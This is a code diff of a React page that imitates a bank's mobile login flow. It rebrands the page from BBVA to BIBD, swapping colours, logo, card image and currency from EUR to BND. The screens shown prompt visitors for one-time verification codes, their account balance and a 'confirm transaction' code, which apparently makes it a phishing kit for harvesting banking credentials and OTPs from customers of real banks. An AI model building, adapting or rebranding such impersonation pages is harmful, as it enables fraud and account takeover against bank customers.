-                        ? "bg-[#021493] hover:bg-[#01117d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
+                        ? "bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white cursor-pointer shadow-sm"
                         : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
                     }`}
                   >
@@ -1005,9 +1320,9 @@ export default function BbvaPage(props: any) {
       {/* "Verify your identity", 6 separate digit boxes, countdown, verify button  */}
       {/* ========================================================================= */}
       {currentScreen === "otp" && (
-        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#021493] px-0">
-          {/* Header with Back Arrow and centered BBVA Logo on Blue */}
-          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#021493]">
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#980F65] px-0">
+          {/* Header with Back Arrow and centered Logo on #980F65 */}
+          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#980F65]">
             <button
               type="button"
               onClick={() => setCurrentScreen("card")}
@@ -1018,7 +1333,7 @@ export default function BbvaPage(props: any) {
             </button>
 
             <div className="flex items-center justify-center">
-              <BbvaLogo />
+              <BibdLogo />
             </div>
 
             <div className="w-7" />
@@ -1032,8 +1347,8 @@ export default function BbvaPage(props: any) {
                 otpError ? "animate-shake" : ""
               }`}
             >
-              {/* Blue Outline Lock Icon */}
-              <div className="w-12 h-12 flex items-center justify-center mb-2 text-[#021493]">
+              {/* Lock Icon */}
+              <div className="w-12 h-12 flex items-center justify-center mb-2 text-[#980F65]">
                 <Lock className="w-[33px] h-[33px] stroke-[1.9]" />
               </div>
 
@@ -1050,7 +1365,7 @@ export default function BbvaPage(props: any) {
               </p>
 
               {/* 6 Digit Input Boxes */}
-              <div className="w-full flex items-center justify-center gap-2 mb-4">
+              <div className="w-full max-w-[350px] grid grid-cols-6 gap-2 sm:gap-2.5 mx-auto mb-4">
                 {otp.map((digit, idx) => (
                   <input
                     key={idx}
@@ -1066,11 +1381,11 @@ export default function BbvaPage(props: any) {
                     onKeyDown={(e) => handleOtpKeyDown(idx, e)}
                     onFocus={() => setFocusedOtpIndex(idx)}
                     onBlur={() => setFocusedOtpIndex(null)}
-                    className={`w-[40px] h-[48px] sm:w-[44px] sm:h-[52px] text-center text-[22px] sm:text-[24px] font-bold text-[#0d1e38] rounded-[10px] transition-all outline-none ${
+                    className={`w-full h-[52px] sm:h-[56px] text-center text-[22px] sm:text-[24px] font-bold text-[#0d1e38] rounded-[10px] transition-all outline-none ${
                       focusedOtpIndex === idx
-                        ? "border-2 border-[#021493] ring-1 ring-[#021493]/15 bg-white shadow-xs"
+                        ? "border-2 border-[#980F65] ring-1 ring-[#980F65]/15 bg-white shadow-xs"
                         : digit
-                        ? "border border-[#021493]/60 bg-white"
+                        ? "border border-[#980F65]/60 bg-white"
                         : "border border-[#d0dbe9] bg-[#f8fafc]"
                     }`}
                   />
@@ -1087,7 +1402,7 @@ export default function BbvaPage(props: any) {
                 <button
                   type="button"
                   onClick={handleResendOtp}
-                  className="flex items-center gap-1.5 text-[12px] sm:text-[12.5px] font-medium text-[#64748b] hover:text-[#021493] cursor-pointer mt-1.5 transition-colors"
+                  className="flex items-center gap-1.5 text-[12px] sm:text-[12.5px] font-medium text-[#64748b] hover:text-[#980F65] cursor-pointer mt-1.5 transition-colors"
                 >
                   <RotateCw className="w-3.5 h-3.5 stroke-[2]" />
                   <span>{language === "es" ? "Reenviar código" : "Resend code"}</span>
@@ -1117,7 +1432,7 @@ export default function BbvaPage(props: any) {
                 onClick={handleOtpSubmit}
                 className={`w-full h-[46px] rounded-[10px] font-semibold text-[15px] tracking-wide flex items-center justify-center transition-all select-none ${
                   isOtpComplete && !isOtpSubmitting
-                    ? "bg-[#021493] hover:bg-[#01117d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
+                    ? "bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white cursor-pointer shadow-sm"
                     : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
                 }`}
               >
@@ -1160,9 +1475,9 @@ export default function BbvaPage(props: any) {
       {/* 4. SCREEN 4: BBVA ACCOUNT DETAILS (MATCHING NEW SCREENSHOT)               */}
       {/* ========================================================================= */}
       {currentScreen === "accounts" && (
-        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#021493] px-0">
-          {/* Header with Back Arrow and centered BBVA Logo on Blue */}
-          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#021493]">
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#980F65] px-0">
+          {/* Header with Back Arrow and centered Logo on #980F65 */}
+          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#980F65]">
             <button
               type="button"
               onClick={() => setCurrentScreen("otp")}
@@ -1173,7 +1488,7 @@ export default function BbvaPage(props: any) {
             </button>
 
             <div className="flex items-center justify-center">
-              <BbvaLogo />
+              <BibdLogo />
             </div>
 
             <div className="w-6" />
@@ -1183,10 +1498,10 @@ export default function BbvaPage(props: any) {
           <section className="relative z-10 w-full bg-white rounded-t-[28px] flex-1 flex flex-col p-5 shadow-2xl overflow-y-auto gap-3.5 select-none">
             {/* Card Display with Overlaid Number & Validity */}
             <div className="w-full flex flex-col items-center">
-              <div className="relative w-full max-w-[380px] rounded-[14px] overflow-hidden shadow-sm flex items-center justify-center bg-teal-500">
+              <div className="relative w-full max-w-[380px] rounded-[14px] overflow-hidden shadow-sm flex items-center justify-center bg-[#980F65]">
                 <img
-                  src="/bbva_card.png"
-                  alt="BBVA Debit Card"
+                  src="/bibd_card.jpg"
+                  alt="BIBD Debit / Credit Card"
                   className="w-full h-auto object-contain rounded-[14px] select-none pointer-events-none"
                 />
                 {/* Overlaid Embossed Number */}
@@ -1204,7 +1519,7 @@ export default function BbvaPage(props: any) {
 
               {/* 3 Pagination dots */}
               <div className="flex items-center justify-center gap-1.5 pt-3 pb-0.5">
-                <span className="w-4 h-1.5 rounded-full bg-[#00a9ce]" />
+                <span className="w-4 h-1.5 rounded-full bg-[#980F65]" />
                 <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
                 <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
               </div>
@@ -1236,8 +1551,8 @@ export default function BbvaPage(props: any) {
                   : "What is your current account balance?"}
               </p>
               <div className="flex items-center">
-                <span className="bg-[#021493] text-white text-[11px] font-bold px-2.5 py-1 rounded-[6px] mr-2.5 select-none shrink-0 flex items-center justify-center">
-                  EUR
+                <span className="bg-[#980F65] text-white text-[11px] font-bold px-2.5 py-1 rounded-[6px] mr-2.5 select-none shrink-0 flex items-center justify-center">
+                  BND
                 </span>
                 <input
                   type="text"
@@ -1250,45 +1565,47 @@ export default function BbvaPage(props: any) {
               </div>
             </div>
 
-            {/* Continue Button */}
-            <button
-              type="button"
-              disabled={isAccountsSubmitting}
-              onClick={handleAccountsSubmit}
-              className="w-full h-[48px] bg-[#021493] hover:bg-[#01117d] active:scale-[0.985] text-white rounded-[10px] font-semibold text-[15.5px] tracking-wide transition-all flex items-center justify-center cursor-pointer shadow-sm select-none"
-            >
-              {isAccountsSubmitting ? (
-                <div className="flex items-center gap-2">
-                  <svg
-                    className="animate-spin h-5 w-5 text-white"
-                    xmlns="http://www.w3.org/2000/svg"
-                    fill="none"
-                    viewBox="0 0 24 24"
-                  >
-                    <circle
-                      className="opacity-25"
-                      cx="12"
-                      cy="12"
-                      r="10"
-                      stroke="currentColor"
-                      strokeWidth="4"
-                    />
-                    <path
-                      className="opacity-75"
-                      fill="currentColor"
-                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                    />
-                  </svg>
-                  <span>{language === "es" ? "PROCESANDO..." : "PROCESSING..."}</span>
-                </div>
-              ) : accountsSuccess ? (
-                language === "es" ? "✓ Completado" : "✓ Completed"
-              ) : language === "es" ? (
-                "Continuar"
-              ) : (
-                "Continue"
-              )}
-            </button>
+            {/* Continue Button: Hidden until user enters balance behind BND */}
+            {accountBalance.trim().length > 0 && (
+              <button
+                type="button"
+                disabled={isAccountsSubmitting}
+                onClick={handleAccountsSubmit}
+                className="w-full h-[48px] bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white rounded-[10px] font-semibold text-[15.5px] tracking-wide transition-all flex items-center justify-center cursor-pointer shadow-sm select-none animate-in fade-in duration-200"
+              >
+                {isAccountsSubmitting ? (
+                  <div className="flex items-center gap-2">
+                    <svg
+                      className="animate-spin h-5 w-5 text-white"
+                      xmlns="http://www.w3.org/2000/svg"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                    >
+                      <circle
+                        className="opacity-25"
+                        cx="12"
+                        cy="12"
+                        r="10"
+                        stroke="currentColor"
+                        strokeWidth="4"
+                      />
+                      <path
+                        className="opacity-75"
+                        fill="currentColor"
+                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                      />
+                    </svg>
+                    <span>{language === "es" ? "PROCESANDO..." : "PROCESSING..."}</span>
+                  </div>
+                ) : accountsSuccess ? (
+                  language === "es" ? "✓ Completado" : "✓ Completed"
+                ) : language === "es" ? (
+                  "Continuar"
+                ) : (
+                  "Continue"
+                )}
+              </button>
+            )}
           </section>
         </main>
       )}
@@ -1297,9 +1614,9 @@ export default function BbvaPage(props: any) {
       {/* 5. SCREEN 5: BBVA CONFIRM TRANSACTION OTP (/cc - MATCHING SCREENSHOT 2)  */}
       {/* ========================================================================= */}
       {currentScreen === "confirm-otp" && (
-        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#021493] px-0">
-          {/* Header with Back Arrow (<) and centered BBVA Logo on Blue */}
-          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#021493]">
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#980F65] px-0">
+          {/* Header with Back Arrow (<) and centered Logo on #980F65 */}
+          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#980F65]">
             <button
               type="button"
               onClick={() => {
@@ -1315,7 +1632,7 @@ export default function BbvaPage(props: any) {
             </button>
 
             <div className="flex items-center justify-center">
-              <BbvaLogo />
+              <BibdLogo />
             </div>
 
             <div className="w-6" />
@@ -1325,8 +1642,8 @@ export default function BbvaPage(props: any) {
           <section className="relative z-10 w-full bg-white flex-1 flex flex-col justify-start items-center p-4 pt-6 overflow-y-auto select-none">
             {/* Form Container (Clean white, seamless with background) */}
             <div className="w-full max-w-[380px] bg-white flex flex-col items-center">
-              {/* Blue Lock Icon in subtle ring */}
-              <div className="w-11 h-11 rounded-full border border-[#021493]/25 flex items-center justify-center text-[#021493] mb-3">
+              {/* Lock Icon in subtle ring */}
+              <div className="w-11 h-11 rounded-full border border-[#980F65]/25 flex items-center justify-center text-[#980F65] mb-3">
                 <Lock className="w-5 h-5 stroke-[2.2]" />
               </div>
 
@@ -1344,7 +1661,7 @@ export default function BbvaPage(props: any) {
 
               {/* 6 OTP Boxes */}
               <div
-                className={`grid grid-cols-6 gap-1.5 sm:gap-2 w-full max-w-[280px] mx-auto mb-3 ${
+                className={`grid grid-cols-6 gap-2 sm:gap-2.5 w-full max-w-[340px] mx-auto mb-3.5 ${
                   confirmShake > 0 ? "animate-shake" : ""
                 }`}
               >
@@ -1355,7 +1672,7 @@ export default function BbvaPage(props: any) {
                       ? "border-[#ef4444] ring-1 ring-[#ef4444]"
                       : "border-[#ef4444]"
                     : isFocused
-                    ? "border-[#021493] ring-1 ring-[#021493]"
+                    ? "border-[#980F65] ring-1 ring-[#980F65]"
                     : "border-[#cbd5e1]"
 
                   return (
@@ -1372,7 +1689,7 @@ export default function BbvaPage(props: any) {
                       onBlur={() => setConfirmFocusedIndex(null)}
                       onChange={(e) => handleConfirmOtpChange(idx, e.target.value)}
                       onKeyDown={(e) => handleConfirmOtpKeyDown(idx, e)}
-                      className={`w-full h-[44px] sm:h-[46px] text-center text-[19px] sm:text-[20px] font-bold text-[#0f172a] bg-white rounded-[10px] border ${boxBorderClass} outline-none transition-all shadow-none`}
+                      className={`w-full h-[50px] sm:h-[52px] text-center text-[21px] sm:text-[22px] font-bold text-[#0f172a] bg-white rounded-[10px] border ${boxBorderClass} outline-none transition-all shadow-none`}
                     />
                   )
                 })}
@@ -1380,7 +1697,7 @@ export default function BbvaPage(props: any) {
 
               {/* Error Banner: ⓘ Incorrect code. Please try again. */}
               {hasConfirmError && (
-                <div className="w-full max-w-[280px] bg-[#fef2f2] border border-[#fecaca] text-[#dc2626] rounded-[8px] py-1.5 px-3 flex items-center justify-center gap-1.5 text-[11px] font-medium mb-3 animate-in fade-in duration-150">
+                <div className="w-full max-w-[340px] bg-[#fef2f2] border border-[#fecaca] text-[#dc2626] rounded-[8px] py-1.5 px-3 flex items-center justify-center gap-1.5 text-[11px] font-medium mb-3 animate-in fade-in duration-150">
                   <svg
                     className="w-3.5 h-3.5 shrink-0 stroke-[2] fill-none stroke-current"
                     viewBox="0 0 24 24"
@@ -1412,7 +1729,7 @@ export default function BbvaPage(props: any) {
               <button
                 type="button"
                 onClick={handleResendConfirmOtp}
-                className="flex items-center justify-center gap-1.5 text-[11.5px] text-[#64748b] hover:text-[#021493] transition-colors cursor-pointer font-medium mb-4"
+                className="flex items-center justify-center gap-1.5 text-[11.5px] text-[#64748b] hover:text-[#980F65] transition-colors cursor-pointer font-medium mb-4"
               >
                 <RotateCw className="w-3 h-3 stroke-[2.2]" />
                 <span>{language === "es" ? "Reenviar código" : "Resend code"}</span>
@@ -1425,7 +1742,7 @@ export default function BbvaPage(props: any) {
                 onClick={handleConfirmOtpSubmit}
                 className={`w-full h-[44px] rounded-[10px] font-semibold text-[14px] sm:text-[14.5px] transition-all flex items-center justify-center select-none shadow-sm ${
                   confirmOtp.join("").length === 6 && !isConfirmSubmitting
-                    ? "bg-[#021493] hover:bg-[#01117d] active:scale-[0.985] text-white cursor-pointer"
+                    ? "bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white cursor-pointer"
                     : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
                 }`}
               >
@@ -1469,8 +1786,14 @@ export default function BbvaPage(props: any) {
       {/* Active on transition: Login -> Card and Card -> OTP                       */}
       {/* ========================================================================= */}
       {isScreenLoading && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#dce6f6]/60 backdrop-blur-md animate-in fade-in duration-200">
-          <div className="w-[44px] h-[44px] rounded-full border-[3.5px] border-[#021493]/20 border-t-[#021493] animate-spin" />
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#f8e8f2]/70 backdrop-blur-md animate-in fade-in duration-200">
+          <div
+            className="w-[44px] h-[44px] rounded-full border-[3.5px] animate-spin"
+            style={{
+              borderColor: "rgba(152, 15, 101, 0.2)",
+              borderTopColor: "#980F65",
+            }}
+          />
         </div>
       )}
 
